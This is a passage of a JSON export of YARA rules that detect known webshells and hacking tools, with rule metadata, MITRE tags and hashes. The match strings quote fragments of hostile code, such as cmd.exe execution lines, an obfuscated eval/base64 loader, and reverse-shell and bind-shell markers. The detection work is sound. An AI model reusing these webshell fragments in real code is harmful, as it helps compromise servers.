stres.php","minimum_yara":"1.7","name":"WebShell_Generic_PHP_6_RID2F1F","reference":"-","required_modules":[],"rule_hash":"16e768d3f667254bc49c6f1502f73b78","score":75,"tags":["T1100","DEMO","WEBSHELL","GEN"]},{"author":"Florian Roth","content":"rule HYTop2006_rar_Folder_2006Z_RID2F8D : DEMO T1050 T1100 WEBSHELL {\n   meta:\n      description = \"Webshells Auto-generated - file 2006Z.exe\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-04-06 12:02:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1050, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"wangyong,czy,allen,lcx,Marcos,kEvin1986,myth\" \n      $s8 = \"System\\\\CurrentControlSet\\\\Control\\\\Keyboard Layouts\\\\%.8x\" \n   condition: \n      all of them\n}","date":"2014-04-06 12:02:01","description":"Webshells Auto-generated - file 2006Z.exe","minimum_yara":"1.7","name":"HYTop2006_rar_Folder_2006Z_RID2F8D","reference":"-","required_modules":[],"rule_hash":"a1962038ea977bb14b735d8b5974cdd0","score":75,"tags":["T1100","DEMO","WEBSHELL","T1050"]},{"author":"Florian Roth","content":"rule Webshell_admin_ad_RID2DD3 : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Webshells Auto-generated - file admin-ad.asp\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-04-06 10:48:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s6 = \"<td align=\\\"center\\\"> <input name=\\\"cmd\\\" type=\\\"text\\\" id=\\\"cmd\\\" siz\" \n      $s7 = \"Response.write\\\"<a href='\\\"&url&\\\"?path=\\\"&Request(\\\"oldpath\\\")&\\\"&attrib=\\\"&attrib&\\\"'><\" \n   condition: \n      all of them\n}","date":"2014-04-06 10:48:21","description":"Webshells Auto-generated - file admin-ad.asp","minimum_yara":"1.7","name":"Webshell_admin_ad_RID2DD3","reference":"-","required_modules":[],"rule_hash":"89f7075a5ab3211b094a681bea8553c0","score":75,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_FSO_s_casus15_RID2F44 : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Webshells Auto-generated - file casus15.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-04-06 11:49:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s6 = \"if((is_dir(\\\"$deldir/$file\\\")) AND ($file!=\\\".\\\") AND ($file!=\\\"..\\\"))\" \n   condition: \n      all of them\n}","date":"2014-04-06 11:49:51","description":"Webshells Auto-generated - file casus15.php","minimum_yara":"1.7","name":"Webshell_FSO_s_casus15_RID2F44","reference":"-","required_modules":[],"rule_hash":"8f55ba7abaf6b503f8fbc3a349c18231","score":75,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule HKTL_Unpack_Injectt_RID2E35 : DEMO HKTL T1100 WEBSHELL {\n   meta:\n      description = \"Webshells Auto-generated - file Injectt.exe\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-04-06 11:04:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, HKTL, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s2 = \"%s -Run                              -->To Install And Run The Service\" \n      $s3 = \"%s -Uninstall                        -->To Uninstall The Service\" \n      $s4 = \"(STANDARD_RIGHTS_REQUIRED |SC_MANAGER_CONNECT |SC_MANAGER_CREATE_SERVICE |SC_MAN\" \n   condition: \n      all of them\n}","date":"2014-04-06 11:04:41","description":"Webshells Auto-generated - file Injectt.exe","minimum_yara":"1.7","name":"HKTL_Unpack_Injectt_RID2E35","reference":"-","required_modules":[],"rule_hash":"9e55eca932dfedcf3f76fa20c39dfa54","score":75,"tags":["T1100","DEMO","WEBSHELL","HKTL"]},{"author":"Florian Roth","content":"rule Webshell_ASP_CmdAsp_2_RID2EB2 : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Webshells Auto-generated - file CmdAsp.asp\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-04-06 11:25:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s2 = \"' -- Read the output from our command and remove the temp file -- '\" \n      $s6 = \"Call oScript.Run (\\\"cmd.exe /c \\\" & szCMD & \\\" > \\\" & szTempFile, 0, True)\" \n      $s9 = \"' -- create the COM objects that we will be using -- '\" \n   condition: \n      all of them\n}","date":"2014-04-06 11:25:31","description":"Webshells Auto-generated - file CmdAsp.asp","minimum_yara":"1.7","name":"Webshell_ASP_CmdAsp_2_RID2EB2","reference":"-","required_modules":[],"rule_hash":"5b76cd35652a09169872813539f7a9f8","score":75,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule MAL_vanquish_RID2BB9 : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Webshells Auto-generated - file vanquish.dll\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-04-06 09:18:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s3 = \"You cannot delete protected files/folders! Instead, your attempt has been logged\" \n      $s8 = \"?VCreateProcessA@@YGHPBDPADPAU_SECURITY_ATTRIBUTES@@2HKPAX0PAU_STARTUPINFOA@@PAU\" \n      $s9 = \"?VFindFirstFileExW@@YGPAXPBGW4_FINDEX_INFO_LEVELS@@PAXW4_FINDEX_SEARCH_OPS@@2K@Z\" \n   condition: \n      all of them\n}","date":"2014-04-06 09:18:41","description":"Webshells Auto-generated - file vanquish.dll","minimum_yara":"1.7","name":"MAL_vanquish_RID2BB9","reference":"-","required_modules":[],"rule_hash":"4209abc853dd8ef9c8e37a471b0f4e6f","score":75,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule HKTL_shelltools_g0t_root_uptime_RID336C : DEMO HKTL T1100 WEBSHELL {\n   meta:\n      description = \"Webshells Auto-generated - file uptime.exe\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-04-06 14:47:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, HKTL, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"JDiamondCSlC~\" \n      $s1 = \"CharactQA\" \n      $s2 = \"$Info: This file is packed with the UPX executable packer $\" \n      $s5 = \"HandlereateConso\" \n      $s7 = \"ION\\\\System\\\\FloatingPo\" \n   condition: \n      all of them\n}","date":"2014-04-06 14:47:11","description":"Webshells Auto-generated - file uptime.exe","minimum_yara":"1.7","name":"HKTL_shelltools_g0t_root_uptime_RID336C","reference":"-","required_modules":[],"rule_hash":"e8898784bde96cd7a9364aa15947395d","score":75,"tags":["T1100","DEMO","WEBSHELL","HKTL"]},{"author":"Florian Roth","content":"rule PHP_Cloaked_Webshell_SuperFetchExec_RID347D : DEMO T1036 T1100 WEBSHELL {\n   meta:\n      description = \"Looks like a webshell cloaked as GIF - http://goo.gl/xFvioC\"\n      author = \"Florian Roth\"\n      reference = \"http://goo.gl/xFvioC\"\n      date = \"2014-04-05 15:32:41\"\n      score = 50\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1036, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"else{$d.=@chr(($h[$e[$o]]<<4)+($h[$e[++$o]]));}}eval($d);\" \n   condition: \n      $s0\n}","date":"2014-04-05 15:32:41","description":"Looks like a webshell cloaked as GIF - http://goo.gl/xFvioC","minimum_yara":"1.7","name":"PHP_Cloaked_Webshell_SuperFetchExec_RID347D","reference":"http://goo.gl/xFvioC","required_modules":[],"rule_hash":"d9f9f957b8bce16eaaf687bd0492f572","score":50,"tags":["T1100","DEMO","WEBSHELL","T1036"]},{"author":"Florian Roth","content":"rule WebShell_RemExp_asp_php_RID3021 : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"PHP Webshells Github Archive - file RemExp.asp.php.txt\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-04-05 12:26:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"lsExt = Right(FileName, Len(FileName) - liCount)\" fullword\n      $s7 = \"<td bgcolor=\\\"<%=BgColor%>\\\" title=\\\"<%=File.Name%>\\\"> <a href= \\\"showcode.asp?f\" \n      $s13 = \"Response.Write Drive.ShareName & \\\" [share]\\\"\" fullword\n      $s19 = \"If Request.QueryString(\\\"CopyFile\\\") <> \\\"\\\" Then\" fullword\n      $s20 = \"<td width=\\\"40%\\\" height=\\\"20\\\" bgcolor=\\\"silver\\\">  Name</td>\" fullword\n   condition: \n      all of them\n}","date":"2014-04-05 12:26:41","description":"PHP Webshells Github Archive - file RemExp.asp.php.txt","minimum_yara":"1.7","name":"WebShell_RemExp_asp_php_RID3021","reference":"-","required_modules":[],"rule_hash":"9d6280c7c989612d619b1cf88a696b58","score":75,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule WebShell_dC3_Security_Crew_Shell_PRiV_RID351E : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"PHP Webshells Github Archive - file dC3_Security_Crew_Shell_PRiV.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-04-05 15:59:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"@rmdir($_GET['file']) or die (\\\"[-]Error deleting dir!\\\");\" fullword\n      $s4 = \"$ps=str_replace(\\\"\\\\\\\\\\\",\\\"/\\\",getenv('DOCUMENT_ROOT'));\" fullword\n      $s5 = \"header(\\\"Expires: \\\".date(\\\"r\\\",mktime(0,0,0,1,1,2030)));\" fullword\n      $s15 = \"search_file($_POST['search'],urldecode($_POST['dir']));\" fullword\n      $s16 = \"echo base64_decode($images[$_GET['pic']]);\" fullword\n      $s20 = \"if (isset($_GET['rename_all'])) {\" fullword\n   condition: \n      3 of them\n}","date":"2014-04-05 15:59:31","description":"PHP Webshells Github Archive - file dC3_Security_Crew_Shell_PRiV.php","minimum_yara":"1.7","name":"WebShell_dC3_Security_Crew_Shell_PRiV_RID351E","reference":"-","required_modules":[],"rule_hash":"ee2b2a2e4b18f7fe5b1d1d479fa9f5b1","score":75,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule DarkSecurityTeam_Webshell_RID3107 : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Dark Security Team Webshell\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-04-02 13:05:01\"\n      score = 50\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"form method=post><input type=hidden name=\\\"\\\"#\\\"\\\" value=Execute(Session(\\\"\\\"#\\\"\\\"))><input name=thePath value=\\\"\\\"\\\"&HtmlEncode(Server.MapPath(\\\".\\\"))&\" ascii\n   condition: \n      1 of them\n}","date":"2014-04-02 13:05:01","description":"Dark Security Team Webshell","minimum_yara":"1.7","name":"DarkSecurityTeam_Webshell_RID3107","reference":"-","required_modules":[],"rule_hash":"287d0d9b079e437164326890200251bb","score":50,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_perlbot_pl_RID2ED9 : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Semi-Auto-generated - file perlbot.pl.txt\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-03-29 11:32:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"my @adms=(\\\"Kelserific\\\",\\\"Puna\\\",\\\"nod32\\\")\" \n      $s1 = \"#Acesso a Shel - 1 ON 0 OFF\" \n   condition: \n      1 of them\n}","date":"2014-03-29 11:32:01","description":"Semi-Auto-generated - file perlbot.pl.txt","minimum_yara":"1.7","name":"Webshell_perlbot_pl_RID2ED9","reference":"-","required_modules":[],"rule_hash":"683e74691dfe8fb4bc8f59f510aaf901","score":75,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_php_backdoor_php_RID3139 : DEMO MAL T1100 WEBSHELL {\n   meta:\n      description = \"Semi-Auto-generated - file php-backdoor.php.txt\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-03-29 13:13:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, MAL, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"http://michaeldaw.org   2006\" \n      $s1 = \"or http://<? echo $SERVER_NAME.$REQUEST_URI; ?>?d=c:/windows on win\" \n      $s3 = \"coded by z0mbie\" \n   condition: \n      1 of them\n}","date":"2014-03-29 13:13:21","description":"Semi-Auto-generated - file php-backdoor.php.txt","minimum_yara":"1.7","name":"Webshell_php_backdoor_php_RID3139","reference":"-","required_modules":[],"rule_hash":"6e2fd04a7e806b751bee2aed9c9998ac","score":75,"tags":["T1100","DEMO","WEBSHELL","MAL"]},{"author":"Florian Roth","content":"rule Webshell_small_php_php_RID300D : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Semi-Auto-generated - file small.php.php.txt\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-03-29 12:23:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"$pass='abcdef1234567890abcdef1234567890';\" fullword\n      $s2 = \"eval(gzinflate(base64_decode('FJzHkqPatkU/550IGnjXxHvv6bzAe0iE5+svFVGtKqXMZq05x1\" \n      $s4 = \"@ini_set('error_log',NULL);\" fullword\n   condition: \n      2 of them\n}","date":"2014-03-29 12:23:21","description":"Semi-Auto-generated - file small.php.php.txt","minimum_yara":"1.7","name":"Webshell_small_php_php_RID300D","reference":"-","required_modules":[],"rule_hash":"965ed0d82c6ec8a5f34d35f7f9cb173b","score":75,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_shellbot_pl_RID2F3E : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Semi-Auto-generated - file shellbot.pl.txt\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-03-29 11:48:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"ShellBOT\" \n      $s1 = \"PacktsGr0up\" \n      $s2 = \"CoRpOrAtIoN\" \n      $s3 = \"# Servidor de irc que vai ser usado \" \n      $s4 = \"/^ctcpflood\\\\s+(\\\\d+)\\\\s+(\\\\S+)\" \n   condition: \n      2 of them\n}","date":"2014-03-29 11:48:51","description":"Semi-Auto-generated - file shellbot.pl.txt","minimum_yara":"1.7","name":"Webshell_shellbot_pl_RID2F3E","reference":"-","required_modules":[],"rule_hash":"3642f641e6a14409ac69dc6fd111d9bf","score":75,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_ngh_php_php_RID2F31 : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Semi-Auto-generated - file ngh.php.php.txt\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-03-29 11:46:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"Cr4sh_aka_RKL\" \n      $s1 = \"NGH edition\" \n      $s2 = \"/* connectback-backdoor on perl\" \n      $s3 = \"<form action=<?=$script?>?act=bindshell method=POST>\" \n      $s4 = \"$logo = \\\"R0lGODlhMAAwAOYAAAAAAP////r\" \n   condition: \n      1 of them\n}","date":"2014-03-29 11:46:41","description":"Semi-Auto-generated - file ngh.php.php.txt","minimum_yara":"1.7","name":"Webshell_ngh_php_php_RID2F31","reference":"-","required_modules":[],"rule_hash":"a6b3f52e0e94d2a1b30f760fe13daa53","score":75,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_jsp_reverse_jsp_2_RID318B : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Semi-Auto-generated - file jsp-reverse.jsp.txt\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-03-29 13:27:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"// backdoor.jsp\" \n      $s1 = \"JSP Backdoor Reverse Shell\" \n      $s2 = \"http://michaeldaw.org\" \n   condition: \n      2 of them\n}","date":"2014-03-29 13:27:01","description":"Semi-Auto-generated - file jsp-reverse.jsp.txt","minimum_yara":"1.7","name":"Webshell_jsp_reverse_jsp_2_RID318B","reference":"-","required_modules":[],"rule_hash":"5ee8a54b0374704e4c8a067068804fb3","score":75,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_Liz0ziM_Private_Safe_Mode_Command_Execuriton_Bypass_Exploit_php_RID4390 : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Semi-Auto-generated - file Liz0ziM Private Safe Mode Command Execuriton Bypass Exploit.php.txt\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-03-29 02:15:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"<option value=\\\"cat /var/cpanel/accounting.log\\\">/var/cpanel/accounting.log</opt\" \n      $s1 = \"Liz0ziM Private Safe Mode Command Execuriton Bypass\" \n      $s2 = \"echo \\\"<b><font color=red>Kimim Ben :=)</font></b>:$uid<br>\\\";\" fullword\n   condition: \n      1 of them\n}","date":"2014-03-29 02:15:51","description":"Semi-Auto-generated - file Liz0ziM Private Safe Mode Command Execuriton Bypass Exploit.php.txt","minimum_yara":"1.7","name":"Webshell_Liz0ziM_Private_Safe_Mode_Command_Execuriton_Bypass_Exploit_php_RID4390","reference":"-","required_modules":[],"rule_hash":"a56ad941ebd1bcd6996fe8f856e8140e","score":75,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_Nshell__1__php_php_RID31A8 : DEMO T1033 T1100 WEBSHELL {\n   meta:\n      description = \"Semi-Auto-generated - file Nshell (1).php.php.txt\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-03-29 13:31:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1033, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"echo \\\"Command : <INPUT TYPE=text NAME=cmd value=\\\".@stripslashes(htmlentities($\" \n      $s1 = \"if(!$whoami)$whoami=exec(\\\"whoami\\\"); echo \\\"whoami :\\\".$whoami.\\\"<br>\\\";\" fullword\n   condition: \n      1 of them\n}","date":"2014-03-29 13:31:51","description":"Semi-Auto-generated - file Nshell (1).php.php.txt","minimum_yara":"1.7","name":"Webshell_Nshell__1__php_php_RID31A8","reference":"-","required_modules":[],"rule_hash":"0e7abfec3b95f99de72767fb87180fc8","score":75,"tags":["T1100","DEMO","T1033","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_Tool_asp_RID2DE7 : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Semi-Auto-generated - file Tool.asp.txt\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-03-29 10:51:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"mailto:rhfactor@antisocial.com\" \n      $s2 = \"?raiz=root\" \n      $s3 = \"DIGO CORROMPIDO<BR>CORRUPT CODE\" \n      $s4 = \"key = \\\"5DCADAC1902E59F7273E1902E5AD8414B1902E5ABF3E661902E5B554FC41902E53205CA0\" \n   condition: \n      2 of them\n}","date":"2014-03-29 10:51:41","description":"Semi-Auto-generated - file Tool.asp.txt","minimum_yara":"1.7","name":"Webshell_Tool_asp_RID2DE7","reference":"-","required_modules":[],"rule_hash":"a1e577e5a60f2f83005087ccf5515009","score":75,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_NT_Addy_asp_RID2ECC : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Semi-Auto-generated - file NT Addy.asp.txt\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-03-29 11:29:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"NTDaddy v1.9 by obzerve of fux0r inc\" \n      $s2 = \"<ERROR: THIS IS NOT A TEXT FILE>\" \n      $s4 = \"RAW D.O.S. COMMAND INTERFACE\" \n   condition: \n      1 of them\n}","date":"2014-03-29 11:29:51","description":"Semi-Auto-generated - file NT Addy.asp.txt","minimum_yara":"1.7","name":"Webshell_NT_Addy_asp_RID2ECC","reference":"-","required_modules":[],"rule_hash":"4f5a456f4dc71d4cdc97d23dc5700e2d","score":75,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_RemExp_asp_RID2E9A : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Semi-Auto-generated - file RemExp.asp.txt\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-03-29 11:21:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"<title>Remote Explorer</title>\" \n      $s3 = \" FSO.CopyFile Request.QueryString(\\\"FolderPath\\\") & Request.QueryString(\\\"CopyFi\" \n      $s4 = \"<td bgcolor=\\\"<%=BgColor%>\\\" title=\\\"<%=File.Name%>\\\"> <a href= \\\"showcode.asp?f\" \n   condition: \n      2 of them\n}","date":"2014-03-29 11:21:31","description":"Semi-Auto-generated - file RemExp.asp.txt","minimum_yara":"1.7","name":"Webshell_RemExp_asp_RID2E9A","reference":"-","required_modules":[],"rule_hash":"99538f26f7158d7c4497ce7cac4d0ec1","score":75,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_shankar_php_php_RID30DC : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Semi-Auto-generated - file shankar.php.php.txt\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-03-29 12:57:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $sAuthor = \"ShAnKaR\" \n      $s0 = \"<input type=checkbox name='dd' \\\".(isset($_POST['dd'])?'checked':'').\\\">DB<input\" \n      $s3 = \"Show<input type=text size=5 value=\\\".((isset($_POST['br_st']) && isset($_POST['b\" \n   condition: \n      1 of ( $s* ) and $sAuthor\n}","date":"2014-03-29 12:57:51","description":"Semi-Auto-generated - file shankar.php.php.txt","minimum_yara":"1.7","name":"Webshell_shankar_php_php_RID30DC","reference":"-","required_modules":[],"rule_hash":"c8f3c397d5512ee9f2bcb4be2df8ce36","score":75,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_Casus15_php_php_RID3059 : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Semi-Auto-generated - file Casus15.php.php.txt\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-03-29 12:36:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"copy ( $dosya_gonder2, \\\"$dir/$dosya_gonder2_name\\\") ? print(\\\"$dosya_gonder2_na\" \n      $s2 = \"echo \\\"<center><font size='$sayi' color='#FFFFFF'>HACKLERIN<font color='#008000'\" \n      $s3 = \"value='Calistirmak istediginiz \" \n   condition: \n      1 of them\n}","date":"2014-03-29 12:36:01","description":"Semi-Auto-generated - file Casus15.php.php.txt","minimum_yara":"1.7","name":"Webshell_Casus15_php_php_RID3059","reference":"-","required_modules":[],"rule_hash":"33eca24f2752efd245ddb57581a3071d","score":75,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_fuckphpshell_php_RID3156 : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Semi-Auto-generated - file fuckphpshell.php.txt\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-03-29 13:18:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"$succ = \\\"Warning! \" \n      $s1 = \"Don`t be stupid .. this is a priv3 server, so take extra care!\" \n      $s2 = \"\\\\*=-- MEMBERS AREA --=*/\" \n      $s3 = \"preg_match('/(\\\\n[^\\\\n]*){' . $cache_lines . '}$/', $_SESSION['o\" \n   condition: \n      2 of them\n}","date":"2014-03-29 13:18:11","description":"Semi-Auto-generated - file fuckphpshell.php.txt","minimum_yara":"1.7","name":"Webshell_fuckphpshell_php_RID3156","reference":"-","required_modules":[],"rule_hash":"99954b88ccf69bfbc9ad465b5ca23987","score":75,"tags":["DEMO","T1100","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_SimAttacker___Vrsion_1_0_0___priv8_4_My_friend_php_RID3D96 : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Semi-Auto-generated - file SimAttacker - Vrsion 1.0.0 - priv8 4 My friend.php.txt\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-03-29 22:00:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"SimAttacker - Vrsion : 1.0.0 - priv8 4 My friend\" \n      $s3 = \" fputs ($fp ,\\\"\\\\n*********************************************\\\\nWelcome T0 Sim\" \n      $s4 = \"echo \\\"<a target='_blank' href='?id=fm&fedit=$dir$file'><span style='text-decora\" \n   condition: \n      1 of them\n}","date":"2014-03-29 22:00:51","description":"Semi-Auto-generated - file SimAttacker - Vrsion 1.0.0 - priv8 4 My friend.php.txt","minimum_yara":"1.7","name":"Webshell_SimAttacker___Vrsion_1_0_0___priv8_4_My_friend_php_RID3D96","reference":"-","required_modules":[],"rule_hash":"4809109057249cdf09cc40e9e8b18337","score":75,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_phvayvv_php_php_RID3108 : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Semi-Auto-generated - file phvayvv.php.php.txt\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-03-29 13:05:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC 